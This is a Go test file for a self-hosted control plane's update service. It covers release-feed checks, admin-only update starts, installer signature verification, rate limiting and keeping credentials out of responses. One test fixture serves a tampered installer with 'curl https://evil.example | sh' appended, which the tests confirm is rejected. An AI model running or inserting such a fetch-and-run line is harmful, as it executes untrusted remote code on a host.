package sysupdate

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"sync"
	"testing"
	"time"

	"github.com/danielgtaylor/huma/v2"
	"github.com/google/uuid"
	"github.com/jackc/pgx/v5"
	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/stretchr/testify/require"

	"github.com/nebulactrl/nebulactrl/internal/agents"
	"github.com/nebulactrl/nebulactrl/internal/apierr"
	"github.com/nebulactrl/nebulactrl/internal/auth"
	"github.com/nebulactrl/nebulactrl/internal/config"
	"github.com/nebulactrl/nebulactrl/internal/db"
	"github.com/nebulactrl/nebulactrl/internal/policy"
	"github.com/nebulactrl/nebulactrl/internal/releasesign"
	"github.com/nebulactrl/nebulactrl/internal/testutil"
	"github.com/nebulactrl/nebulactrl/pkg/agentprotocol"
)

var bg = context.Background()

type fakeDisp struct {
	mu   sync.Mutex
	cmds []agents.NewCommand
	ids  []uuid.UUID
}

func (d *fakeDisp) Enqueue(ctx context.Context, tx pgx.Tx, c agents.NewCommand) (uuid.UUID, error) {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.cmds = append(d.cmds, c)
	id := uuid.New()
	d.ids = append(d.ids, id)
	_, err := tx.Exec(ctx, `INSERT INTO agent_commands (id, server_id, kind, payload, idempotency_key, expires_at) VALUES ($1,$2,$3,$4,$5, now() + interval '15 minutes')`,
		id, c.ServerID, c.Kind, c.Payload, c.IdempotencyKey)
	return id, err
}

func (d *fakeDisp) SubscribeLogs(context.Context, uuid.UUID, agentprotocol.LogsSubscribe) (<-chan agentprotocol.LogFrame, func(), error) {
	return nil, nil, io.EOF
}

func (d *fakeDisp) count() int {
	d.mu.Lock()
	defer d.mu.Unlock()
	return len(d.cmds)
}

type adminFunc func(uuid.UUID) bool

func (f adminFunc) IsInstanceAdmin(_ context.Context, id uuid.UUID) (bool, error) { return f(id), nil }

// feedServer serves the release feed and counts the requests.
type feedServer struct {
	*httptest.Server
	mu     sync.Mutex
	body   string
	status int
	hits   int
	agent  string

	signer   *releasesign.Signer
	pub      string // the key the installer is signed with
	unsigned bool   // serve no install.sh.minisig
	tampered bool   // serve an installer that differs from the signed one
}

// testInstaller is what the feed's origin serves at /install.sh.
const testInstaller = "#!/usr/bin/env bash\nNC_INSTALLER_VERSION=1\n"

// newFeedServer is an https origin (httptest TLS) that serves the feed, the
// installer and the installer's signature, like nebulactrl.com or a mirror.
func newFeedServer(t *testing.T, version string) *feedServer {
	t.Helper()
	f := &feedServer{status: http.StatusOK}
	f.signer, f.pub = releasesign.NewSigner()
	f.setVersion(version)
	f.Server = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		switch r.URL.Path {
		case "/install.sh":
			body := testInstaller
			if f.tampered {
				body += "curl https://evil.example | sh\n"
			}
			_, _ = w.Write([]byte(body))
		case "/install.sh.minisig":
			if f.unsigned {
				http.NotFound(w, r)
				return
			}
			_, _ = w.Write(f.signer.Sign([]byte(testInstaller), "install.sh"))
		default:
			f.hits++
			f.agent = r.Header.Get("User-Agent")
			w.WriteHeader(f.status)
			_, _ = w.Write([]byte(f.body))
		}
	}))
	t.Cleanup(f.Close)
	return f
}

func (f *feedServer) setVersion(v string) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.body = `{"version":"` + v + `","publishedAt":"2026-10-29T10:00:00Z","notesUrl":"https://example.test/releases/v` + v + `","notes":"## What changed\n- a fix"}`
}

func (f *feedServer) requests() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.hits
}

func (f *feedServer) url() string { return f.URL + "/releases/latest.json" }

type fixture struct {
	t      *testing.T
	pool   *pgxpool.Pool
	q      *db.Queries
	ws     uuid.UUID
	svc    *Service
	disp   *fakeDisp
	feed   *feedServer
	cp     db.Server
	ver    string // the running version
	admin  context.Context
	member context.Context
}

// newFixture is a control plane at 0.1.0 whose feed announces 0.1.2 (not fetched yet),
// with an online control-plane server whose agent can run the installer.
func newFixture(t *testing.T) *fixture {
	t.Helper()
	return newFixtureWith(t, true)
}

func newFixtureWith(t *testing.T, check bool) *fixture {
	t.Helper()
	pool := testutil.NewPool(t)
	q := db.New(pool)
	ws, err := q.CreateWorkspace(bg, "w")
	require.NoError(t, err)
	a, err := q.CreateUser(bg, db.CreateUserParams{WorkspaceID: ws.ID, Email: "a@example.com", Name: "A", PasswordHash: "x"})
	require.NoError(t, err)
	m, err := q.CreateUser(bg, db.CreateUserParams{WorkspaceID: ws.ID, Email: "m@example.com", Name: "M", PasswordHash: "x"})
	require.NoError(t, err)
	f := &fixture{
		t: t, pool: pool, q: q, ws: ws.ID, disp: &fakeDisp{}, feed: newFeedServer(t, "0.1.2"), ver: "0.1.0",
		admin:  auth.WithPrincipal(bg, &auth.Principal{Type: auth.TypeUser, UserID: a.ID, WorkspaceID: ws.ID, Role: auth.RoleOwner, Label: "a", Scopes: policy.AllScopes}),
		member: auth.WithPrincipal(bg, &auth.Principal{Type: auth.TypeUser, UserID: m.ID, WorkspaceID: ws.ID, Role: auth.RoleOwner, Label: "m", Scopes: policy.AllScopes}),
	}
	f.svc = NewService(Deps{
		Pool: pool, Dispatcher: f.disp, Admins: adminFunc(func(id uuid.UUID) bool { return id == a.ID }),
		Config: config.Update{Check: check, FeedURL: f.feed.url()}, HTTP: f.feed.Client(), PublicKey: f.feed.pub,
		Version: func() string { return f.ver },
	})
	f.cp = f.addControlPlane("online", agentprotocol.CapUpdateControlPlane)
	return f
}

func (f *fixture) addControlPlane(status string, caps ...string) db.Server {
	f.t.Helper()
	email := "ops@example.com"
	srv, err := f.q.CreateControlPlaneServer(bg, db.CreateControlPlaneServerParams{WorkspaceID: f.ws, Name: "cp-host", AcmeEmail: &email})
	require.NoError(f.t, err)
	facts, err := json.Marshal(agentprotocol.Facts{OS: "linux", Arch: "amd64", Capabilities: caps})
	require.NoError(f.t, err)
	_, err = f.pool.Exec(bg, `UPDATE servers SET status = $2, facts = $3 WHERE id = $1`, srv.ID, status, facts)
	require.NoError(f.t, err)
	srv, err = f.q.GetServerByID(bg, srv.ID)
	require.NoError(f.t, err)
	return srv
}

func (f *fixture) get(ctx context.Context) UpdateView {
	f.t.Helper()
	v, err := f.svc.Get(ctx)
	require.NoError(f.t, err)
	return v
}

func (f *fixture) check() {
	f.t.Helper()
	require.NoError(f.t, f.svc.Check(bg))
}

func (f *fixture) audited(action string) int {
	f.t.Helper()
	var n int
	require.NoError(f.t, f.pool.QueryRow(bg, `SELECT count(*) FROM audit_events WHERE action = $1`, action).Scan(&n))
	return n
}

func code(t *testing.T, err error) string {
	t.Helper()
	ae, ok := apierr.As(err)
	require.True(t, ok, "not an API error: %v", err)
	return ae.Code
}

func TestNewerReleaseShowsTheNoticeToEveryone(t *testing.T) {
	f := newFixture(t)

	v := f.get(f.member)
	require.Equal(t, "0.1.0", v.Current)
	require.False(t, v.Available, "nothing is known before the first check")
	require.True(t, v.CheckEnabled)
	require.Empty(t, v.ManualCommand, "the command names the mirror: only the instance admin sees it")
	require.Equal(t, "curl -fsSL "+f.feed.URL+"/install.sh | sudo bash", f.get(f.admin).ManualCommand)

	f.check()
	require.Equal(t, "nebulactrl/0.1.0", f.feed.agent, "the User-Agent names the version and nothing else")
	v = f.get(f.member)
	require.Equal(t, "0.1.2", v.Latest)
	require.True(t, v.Available)
	require.Contains(t, v.Notes, "## What changed")
	require.Equal(t, "https://example.test/releases/v0.1.2", v.NotesURL)
	require.NotNil(t, v.PublishedAt)
	require.NotNil(t, v.CheckedAt)
	require.Empty(t, v.CheckError)
	require.Empty(t, v.ManualCommand)
	require.Equal(t, "curl -fsSL "+f.feed.URL+"/install.sh | sudo bash -s -- --update-to 0.1.2", f.get(f.admin).ManualCommand,
		"the installer comes from where the feed does")
	require.Nil(t, v.Updating)

	// Everyone sees it; only the instance admin can act on it.
	require.False(t, v.CanUpdate)
	require.Equal(t, "Only the instance admin can update.", v.CannotUpdateReason)
	a := f.get(f.admin)
	require.True(t, a.CanUpdate, a.CannotUpdateReason)
	require.Empty(t, a.CannotUpdateReason)
}

func TestDevelopmentBuildNeverShowsAnUpdate(t *testing.T) {
	f := newFixture(t)
	f.ver = "dev"
	f.check()
	v := f.get(f.admin)
	require.Equal(t, "dev", v.Current)
	require.Equal(t, "0.1.2", v.Latest, "the feed was read")
	require.False(t, v.Available)
	require.False(t, v.CanUpdate)
	_, err := f.svc.Start(f.admin, "0.1.2")
	require.Equal(t, CodeUpToDate, code(t, err))
}

func TestNothingNewerIsNotAnUpdate(t *testing.T) {
	f := newFixture(t)
	f.ver = "0.1.2"
	f.check()
	require.False(t, f.get(f.admin).Available)
	_, err := f.svc.Start(f.admin, "0.1.2")
	require.Equal(t, CodeUpToDate, code(t, err))
	require.Zero(t, f.disp.count())
}

func TestDisabledCheckNeverContactsTheFeed(t *testing.T) {
	f := newFixtureWith(t, false)
	f.check()
	require.Zero(t, f.feed.requests())

	// Whatever an earlier run stored is not shown while checks are off.
	_, err := f.pool.Exec(bg, `UPDATE instance_update SET latest_version = '9.9.9', checked_at = now()`)
	require.NoError(t, err)
	v := f.get(f.admin)
	require.False(t, v.CheckEnabled)
	require.Empty(t, v.Latest)
	require.False(t, v.Available)
	require.Nil(t, v.CheckedAt)
	require.Contains(t, v.ManualCommand, "| sudo bash")

	_, err = f.svc.Start(f.admin, "9.9.9")
	require.Equal(t, CodeUnavailable, code(t, err))
	require.Zero(t, f.disp.count())
}

func TestFailedCheckKeepsTheLastRelease(t *testing.T) {
	f := newFixture(t)
	f.check()

	f.feed.mu.Lock()
	f.feed.status = http.StatusBadGateway
	f.feed.mu.Unlock()
	f.check() // a failed fetch is recorded, not a failure of the job
	v := f.get(f.member)
	require.Equal(t, "0.1.2", v.Latest)
	require.True(t, v.Available)
	require.Contains(t, v.CheckError, "502")

	f.feed.mu.Lock()
	f.feed.status = http.StatusOK
	f.feed.mu.Unlock()
	f.check()
	require.Empty(t, f.get(f.member).CheckError, "a good fetch clears it")
}

func TestStartIsInstanceAdminOnly(t *testing.T) {
	f := newFixture(t)
	f.check()

	_, err := f.svc.Start(f.member, "0.1.2")
	require.Equal(t, "forbidden", code(t, err))

	tokenID := uuid.New()
	var adminID uuid.UUID
	require.NoError(t, f.pool.QueryRow(bg, `SELECT id FROM users WHERE email = 'a@example.com'`).Scan(&adminID))
	weak := auth.WithPrincipal(bg, &auth.Principal{Type: auth.TypeToken, TokenID: &tokenID, UserID: adminID, WorkspaceID: f.ws, Scopes: []string{policy.ScopeServersRead}})
	_, err = f.svc.Start(weak, "0.1.2")
	require.Equal(t, "forbidden", code(t, err), "a token needs the admin scope even when it belongs to the admin")
	_, err = f.svc.Start(bg, "0.1.2")
	require.Error(t, err, "no principal")
	require.Zero(t, f.disp.count())
	require.Zero(t, f.audited(ActionStart))

	strong := auth.WithPrincipal(bg, &auth.Principal{Type: auth.TypeToken, TokenID: &tokenID, UserID: adminID, WorkspaceID: f.ws, Scopes: []string{policy.ScopeAdmin}})
	_, err = f.svc.Start(strong, "0.1.2")
	require.NoError(t, err)
	require.Equal(t, 1, f.disp.count())
}

func TestStartSendsTheInstallerToTheLocalAgent(t *testing.T) {
	f := newFixture(t)
	f.check()

	v, err := f.svc.Start(f.admin, "v0.1.2")
	require.NoError(t, err)
	require.NotNil(t, v.Updating)
	require.Equal(t, StateRunning, v.Updating.State)
	require.Equal(t, "0.1.0", v.Updating.FromVersion)
	require.Equal(t, "0.1.2", v.Updating.TargetVersion)
	require.False(t, v.CanUpdate)

	require.Equal(t, 1, f.disp.count())
	c := f.disp.cmds[0]
	require.Equal(t, f.cp.ID, c.ServerID, "the agent on the control plane's own host")
	require.Equal(t, agentprotocol.KindUpdateControlPlane, c.Kind)
	var p agentprotocol.UpdateControlPlanePayload
	require.NoError(t, json.Unmarshal(c.Payload, &p))
	require.Equal(t, "0.1.2", p.Version)
	require.Equal(t, f.feed.URL+"/install.sh", p.InstallerURL)

	require.Equal(t, 1, f.audited(ActionStart))
	var md map[string]any
	require.NoError(t, f.pool.QueryRow(bg, `SELECT metadata FROM audit_events WHERE action = $1`, ActionStart).Scan(&md))
	require.Equal(t, "0.1.0", md["from"])
	require.Equal(t, "0.1.2", md["to"])

	// The view of the admin and of everyone else shows it running.
	require.Equal(t, StateRunning, f.get(f.member).Updating.State)
	require.Equal(t, "An update is already running.", f.get(f.admin).CannotUpdateReason)
}

func TestFeedCredentialsNeverReachTheViewOrTheAgent(t *testing.T) {
	f := newFixture(t)
	u, err := url.Parse(f.feed.url())
	require.NoError(t, err)
	u.User = url.UserPassword("mirror-user", "s3cret-token")
	f.svc.cfg.FeedURL = u.String()
	f.check()
	require.True(t, f.get(f.member).Available, "the feed is still read with its credentials")

	for name, ctx := range map[string]context.Context{"member": f.member, "admin": f.admin} {
		raw, err := json.Marshal(f.get(ctx))
		require.NoError(t, err)
		require.NotContains(t, string(raw), "s3cret-token", name)
		require.NotContains(t, string(raw), "mirror-user", name)
	}
	require.Equal(t, "curl -fsSL "+f.feed.URL+"/install.sh | sudo bash -s -- --update-to 0.1.2", f.get(f.admin).ManualCommand)

	_, err = f.svc.Start(f.admin, "0.1.2")
	require.NoError(t, err)
	require.Equal(t, 1, f.disp.count())
	require.NotContains(t, string(f.disp.cmds[0].Payload), "s3cret-token", "the agent's command line gets no credentials")
	var p agentprotocol.UpdateControlPlanePayload
	require.NoError(t, json.Unmarshal(f.disp.cmds[0].Payload, &p))
	require.Equal(t, f.feed.URL+"/install.sh", p.InstallerURL)
}

func TestStartRefusesAnInstallerThatIsNotSignedByTheReleaseKey(t *testing.T) {
	for name, mutate := range map[string]func(*fixture){
		"no signature published": func(f *fixture) { f.feed.mu.Lock(); f.feed.unsigned = true; f.feed.mu.Unlock() },
		"installer was changed":  func(f *fixture) { f.feed.mu.Lock(); f.feed.tampered = true; f.feed.mu.Unlock() },
		"signed with another key": func(f *fixture) {
			_, other := releasesign.NewSigner()
			f.svc.pubKey = other
		},
	} {
		f := newFixture(t)
		f.check()
		mutate(f)
		_, err := f.svc.Start(f.admin, "0.1.2")
		require.Equal(t, CodeUnavailable, code(t, err), name)
		require.Zero(t, f.disp.count(), name)
		require.Zero(t, f.audited(ActionStart), name)
		require.Nil(t, f.get(f.admin).Updating, name+": nothing was started")
	}
}

func TestAPlainHTTPFeedIsNeverRead(t *testing.T) {
	f := newFixture(t)
	plain := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"version":"0.1.2"}`))
	}))
	t.Cleanup(plain.Close)
	f.svc.cfg.FeedURL = plain.URL + "/releases/latest.json"
	f.check()
	v := f.get(f.member)
	require.Empty(t, v.Latest)
	require.Contains(t, v.CheckError, "https://")
}

func TestStartRefusals(t *testing.T) {
	f := newFixture(t)
	_, err := f.svc.Start(f.admin, "0.1.2")
	require.Equal(t, CodeUpToDate, code(t, err), "no check yet: nothing is offered")

	f.check()
	_, err = f.svc.Start(f.admin, "0.1.1")
	require.Equal(t, CodeNotOffered, code(t, err), "only the announced release")
	_, err = f.svc.Start(f.admin, "9.9.9")
	require.Equal(t, CodeNotOffered, code(t, err))
	require.Zero(t, f.disp.count())

	_, err = f.svc.Start(f.admin, "0.1.2")
	require.NoError(t, err)
	_, err = f.svc.Start(f.admin, "0.1.2")
	require.Equal(t, CodeInProgress, code(t, err), "one update at a time")
	require.Equal(t, 1, f.disp.count())
}

func TestOnlyOneOfTwoSimultaneousStartsWins(t *testing.T) {
	f := newFixture(t)
	f.check()
	var wg sync.WaitGroup
	errs := make([]error, 4)
	for i := range errs {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, errs[i] = f.svc.Start(f.admin, "0.1.2")
		}()
	}
	wg.Wait()
	won := 0
	for _, err := range errs {
		if err == nil {
			won++
		} else {
			require.Equal(t, CodeInProgress, code(t, err))
		}
	}
	require.Equal(t, 1, won)
	require.Equal(t, 1, f.disp.count())
}

func TestStartNeedsAControlPlaneServerWithACapableAgent(t *testing.T) {
	// No server of its own (--no-local-server).
	f := newFixture(t)
	_, err := f.pool.Exec(bg, `DELETE FROM servers WHERE is_control_plane`)
	require.NoError(t, err)
	f.check()
	v := f.get(f.admin)
	require.True(t, v.Available)
	require.False(t, v.CanUpdate)
	require.Contains(t, v.CannotUpdateReason, "no server of its own")
	require.Contains(t, v.CannotUpdateReason, "command below")
	_, err = f.svc.Start(f.admin, "0.1.2")
	require.Equal(t, CodeUnavailable, code(t, err))

	// Offline.
	off := newFixture(t)
	_, err = off.pool.Exec(bg, `UPDATE servers SET status = 'offline' WHERE is_control_plane`)
	require.NoError(t, err)
	off.check()
	require.Contains(t, off.get(off.admin).CannotUpdateReason, "offline")
	_, err = off.svc.Start(off.admin, "0.1.2")
	require.Equal(t, CodeUnavailable, code(t, err))

	// An agent that predates the command (or a host without systemd).
	old := newFixture(t)
	_, err = old.pool.Exec(bg, `UPDATE servers SET facts = '{}'::jsonb WHERE is_control_plane`)
	require.NoError(t, err)
	old.check()
	require.Contains(t, old.get(old.admin).CannotUpdateReason, "too old or the host does not run systemd")
	_, err = old.svc.Start(old.admin, "0.1.2")
	require.Equal(t, CodeUnavailable, code(t, err))
	require.Zero(t, old.disp.count())
	require.Zero(t, old.audited(ActionStart))
}

func (f *fixture) running() {
	f.t.Helper()
	f.check()
	_, err := f.svc.Start(f.admin, "0.1.2")
	require.NoError(f.t, err)
}

// The control plane that starts with the target version records success.
func TestStartupRecordsSuccess(t *testing.T) {
	f := newFixture(t)
	f.running()

	// The old control plane restarting (or the installer still working) decides nothing.
	require.NoError(t, f.svc.Settle(bg))
	require.Equal(t, StateRunning, f.get(f.admin).Updating.State)

	f.ver = "0.1.2"
	require.NoError(t, f.svc.Settle(bg))
	v := f.get(f.member)
	require.Equal(t, StateSucceeded, v.Updating.State)
	require.NotNil(t, v.Updating.FinishedAt)
	require.Empty(t, v.Updating.Error)
	require.False(t, v.Available, "the release is installed")
	require.Equal(t, 1, f.audited(ActionSucceeded))

	// Settling again changes nothing (no second audit row).
	require.NoError(t, f.svc.Settle(bg))
	require.Equal(t, 1, f.audited(ActionSucceeded))
}

func TestStartupRecordsAnUnexpectedVersionAsFailure(t *testing.T) {
	f := newFixture(t)
	f.running()
	f.ver = "0.0.9"
	require.NoError(t, f.svc.Settle(bg))
	v := f.get(f.admin)
	require.Equal(t, StateFailed, v.Updating.State)
	require.Contains(t, v.Updating.Error, "came up as 0.0.9, not as the requested 0.1.2")
	require.Equal(t, 1, f.audited(ActionFailed))
}

func TestUpdateWithoutAResultTurnsFailedAndMayBeRetried(t *testing.T) {
	f := newFixture(t)
	f.running()
	_, err := f.pool.Exec(bg, `UPDATE instance_update SET started_at = now() - interval '31 minutes'`)
	require.NoError(t, err)

	v := f.get(f.admin)
	require.Equal(t, StateFailed, v.Updating.State)
	require.Contains(t, v.Updating.Error, "No result within 30 minutes")
	require.True(t, v.CanUpdate, "a lost update does not block the next one")

	_, err = f.svc.Start(f.admin, "0.1.2")
	require.NoError(t, err)
	require.Equal(t, 2, f.disp.count())
}

func TestAgentReportsAnInstallerThatDidNotStart(t *testing.T) {
	f := newFixture(t)
	f.running()
	cid := f.disp.ids[0]

	// Another command's result is not ours.
	require.NoError(t, f.svc.HandleResult(bg, f.cp.ID, uuid.New(), agentprotocol.ResultFrame{Outcome: agentprotocol.OutcomeFailed, Error: "x"}))
	require.Equal(t, StateRunning, f.get(f.admin).Updating.State)

	// Started is not an outcome.
	data, _ := json.Marshal(agentprotocol.UpdateControlPlaneResult{Unit: "nebulactrl-update-1"})
	require.NoError(t, f.svc.HandleResult(bg, f.cp.ID, cid, agentprotocol.ResultFrame{Outcome: agentprotocol.OutcomeSucceeded, Data: data}))
	require.Equal(t, StateRunning, f.get(f.admin).Updating.State)

	require.NoError(t, f.svc.HandleResult(bg, f.cp.ID, cid, agentprotocol.ResultFrame{Outcome: agentprotocol.OutcomeFailed, Error: "this host does not run systemd"}))
	v := f.get(f.admin)
	require.Equal(t, StateFailed, v.Updating.State)
	require.Contains(t, v.Updating.Error, "The installer did not start: this host does not run systemd")
	require.Contains(t, v.Updating.Error, "Nothing was changed")
	require.Equal(t, 1, f.audited(ActionFailed))

	// A late duplicate does not undo or repeat it.
	require.NoError(t, f.svc.HandleResult(bg, f.cp.ID, cid, agentprotocol.ResultFrame{Outcome: agentprotocol.OutcomeFailed, Error: "again"}))
	require.Equal(t, 1, f.audited(ActionFailed))
}

func TestUndeliveredCommandFailsTheUpdate(t *testing.T) {
	f := newFixture(t)
	f.running()
	require.NoError(t, f.svc.HandleUndelivered(bg, uuid.New(), "x"))
	require.Equal(t, StateRunning, f.get(f.admin).Updating.State)

	require.NoError(t, f.svc.HandleUndelivered(bg, f.disp.ids[0], "Not delivered: server offline."))
	v := f.get(f.admin)
	require.Equal(t, StateFailed, v.Updating.State)
	require.Contains(t, v.Updating.Error, "Not delivered: server offline. Nothing was changed.")
}

func TestFinishedUpdateIsShownForAnHour(t *testing.T) {
	f := newFixture(t)
	f.running()
	require.NoError(t, f.svc.HandleUndelivered(bg, f.disp.ids[0], "Not delivered."))
	require.NotNil(t, f.get(f.member).Updating)

	_, err := f.pool.Exec(bg, `UPDATE instance_update SET finished_at = now() - interval '2 hours'`)
	require.NoError(t, err)
	require.Nil(t, f.get(f.member).Updating)
}

func TestOperationsAreRegistered(t *testing.T) {
	require.True(t, Handles(agentprotocol.KindUpdateControlPlane))
	require.False(t, Handles(agentprotocol.KindAgentUpgrade))
	require.Equal(t, "update_check", CheckArgs{}.Kind())
}

// clock makes the service's clock a variable the test moves.
func (f *fixture) clock(start time.Time) *time.Time {
	now := start
	f.svc.now = func() time.Time { return now }
	return &now
}

func TestCheckNowReadsTheFeedAndRefreshesTheView(t *testing.T) {
	f := newFixture(t)
	now := f.clock(time.Now())
	require.Zero(t, f.get(f.admin).Latest, "nothing is known before the first check")

	v, err := f.svc.CheckNow(f.admin)
	require.NoError(t, err)
	require.Equal(t, 1, f.feed.requests())
	require.Equal(t, "0.1.2", v.Latest)
	require.True(t, v.Available)
	require.True(t, v.IsAdmin)
	require.True(t, v.CanUpdate, v.CannotUpdateReason)
	require.NotNil(t, v.CheckedAt)
	first := *v.CheckedAt
	require.Equal(t, v, f.get(f.admin), "the answer is the view GET returns")

	// The same release again still moves "last checked".
	*now = now.Add(manualCheckEvery)
	v, err = f.svc.CheckNow(f.admin)
	require.NoError(t, err)
	require.Equal(t, 2, f.feed.requests())
	require.Equal(t, "0.1.2", v.Latest)
	require.NotNil(t, v.CheckedAt)
	require.True(t, v.CheckedAt.After(first), "checkedAt %v is not after %v", v.CheckedAt, first)

	// A new release is picked up at once.
	f.feed.setVersion("0.1.3")
	*now = now.Add(manualCheckEvery)
	v, err = f.svc.CheckNow(f.admin)
	require.NoError(t, err)
	require.Equal(t, "0.1.3", v.Latest)
	require.True(t, v.Available)
}

func TestCheckNowIsInstanceAdminOnly(t *testing.T) {
	f := newFixture(t)

	_, err := f.svc.CheckNow(f.member)
	require.Equal(t, "forbidden", code(t, err))
	_, err = f.svc.CheckNow(bg)
	require.Error(t, err, "no principal")

	tokenID := uuid.New()
	var adminID uuid.UUID
	require.NoError(t, f.pool.QueryRow(bg, `SELECT id FROM users WHERE email = 'a@example.com'`).Scan(&adminID))
	weak := auth.WithPrincipal(bg, &auth.Principal{Type: auth.TypeToken, TokenID: &tokenID, UserID: adminID, WorkspaceID: f.ws, Scopes: []string{policy.ScopeServersRead}})
	_, err = f.svc.CheckNow(weak)
	require.Equal(t, "forbidden", code(t, err), "a token needs the admin scope even when it belongs to the admin")
	require.Zero(t, f.feed.requests(), "a refused call never reads the feed")
	require.False(t, f.get(f.member).IsAdmin)
	require.True(t, f.get(f.admin).IsAdmin)
}

func TestCheckNowWithChecksOffIsAConflict(t *testing.T) {
	f := newFixtureWith(t, false)

	_, err := f.svc.CheckNow(f.admin)
	require.Equal(t, CodeCheckDisabled, code(t, err))
	ae, _ := apierr.As(err)
	require.Equal(t, http.StatusConflict, ae.Status)
	require.Contains(t, ae.Message, "NEBULACTRL_UPDATE_CHECK")
	require.Zero(t, f.feed.requests())
}

func TestCheckNowIsLimitedToOnceEvery30Seconds(t *testing.T) {
	f := newFixture(t)
	now := f.clock(time.Now())

	_, err := f.svc.CheckNow(f.admin)
	require.NoError(t, err)

	*now = now.Add(10 * time.Second)
	_, err = f.svc.CheckNow(f.admin)
	ae, ok := apierr.As(err)
	require.True(t, ok, "%v", err)
	require.Equal(t, http.StatusTooManyRequests, ae.Status)
	var he huma.HeadersError
	require.ErrorAs(t, err, &he)
	require.Equal(t, "20", he.GetHeaders().Get("Retry-After"))
	require.Equal(t, 1, f.feed.requests(), "a limited call does not read the feed")

	*now = now.Add(20 * time.Second)
	_, err = f.svc.CheckNow(f.admin)
	require.NoError(t, err)
	require.Equal(t, 2, f.feed.requests())
}

func TestCheckNowSaysWhyTheFeedFailed(t *testing.T) {
	f := newFixture(t)
	now := f.clock(time.Now())
	_, err := f.svc.CheckNow(f.admin)
	require.NoError(t, err)

	f.feed.mu.Lock()
	f.feed.status = http.StatusBadGateway
	f.feed.mu.Unlock()
	*now = now.Add(manualCheckEvery)
	_, err = f.svc.CheckNow(f.admin)
	require.Equal(t, CodeCheckFailed, code(t, err))
	ae, _ := apierr.As(err)
	require.Equal(t, http.StatusBadGateway, ae.Status)
	require.Contains(t, ae.Message, "502")
	v := f.get(f.admin)
	require.Equal(t, "0.1.2", v.Latest, "the last known release stays")
	require.Contains(t, v.CheckError, "502")

	// An unreachable feed does not echo its URL (which may carry credentials).
	f.feed.Close()
	*now = now.Add(manualCheckEvery)
	_, err = f.svc.CheckNow(f.admin)
	require.Equal(t, CodeCheckFailed, code(t, err))
	ae, _ = apierr.As(err)
	require.Contains(t, ae.Message, "could not reach the release feed")
	require.NotContains(t, ae.Message, f.feed.URL)
}
